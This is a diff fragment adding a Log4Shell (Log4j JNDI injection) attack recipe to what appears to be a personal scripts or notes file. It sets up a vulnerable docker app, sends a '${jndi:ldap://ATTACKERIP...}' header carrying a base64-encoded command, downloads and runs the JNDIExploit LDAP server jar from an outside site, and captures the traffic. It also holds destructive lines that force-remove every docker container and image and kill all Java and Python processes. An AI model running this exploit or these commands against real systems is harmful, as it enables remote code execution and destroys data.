@@ -7,6 +7,33 @@ https://rmccurdy.com/.scripts/downloaded/JNDIExploit.v1.2_RENAMED.zip
 Pcap:
 https://rmccurdy.com/.scripts/downloaded/JNDIExploit.v1.2.pcap
 
+
+          
+    # source (victim)  
+    docker rm -f $(docker ps -a -q)  
+    sleep 5  
+    docker rmi -f $(docker images -q)  
+    docker run --name vulnerable-app -p 8080:8080 [ghcr.io/christophetd/log4shell-vulnerable-app](http://ghcr.io/christophetd/log4shell-vulnerable-app)  
+   
+    #run in a loop (attacker)  
+    curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://ATTACKERIP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'  
+         
+    # setup jndi:ldap server (attacker)  
+    # because Zero Fs given ...  
+    killall -9 java  
+    wget -U NOTSPAMMER [https://rmccurdy.com/.scripts/downloaded/JNDIExploit.v1.2_RENAMED.zip](https://rmccurdy.com/.scripts/downloaded/JNDIExploit.v1.2_RENAMED.zip)  
+    unzip [JNDIExploit.v1.2.zip](http://jndiexploit.v1.2.zip/)  
+    java -jar JNDIExploit-1.2-SNAPSHOT.jar -i VICTOM_IP -p 8080  
+      
+      
+    # catch pcap use -w Java_Love_Java.pcap  
+    tcpdump -i any -f "port 8080 or port 1389" -qns 0 -A
+
+
+
+
+# log4j-scan 
+
     killall -9 python3
     killall -9 python3
     killall -9 python3
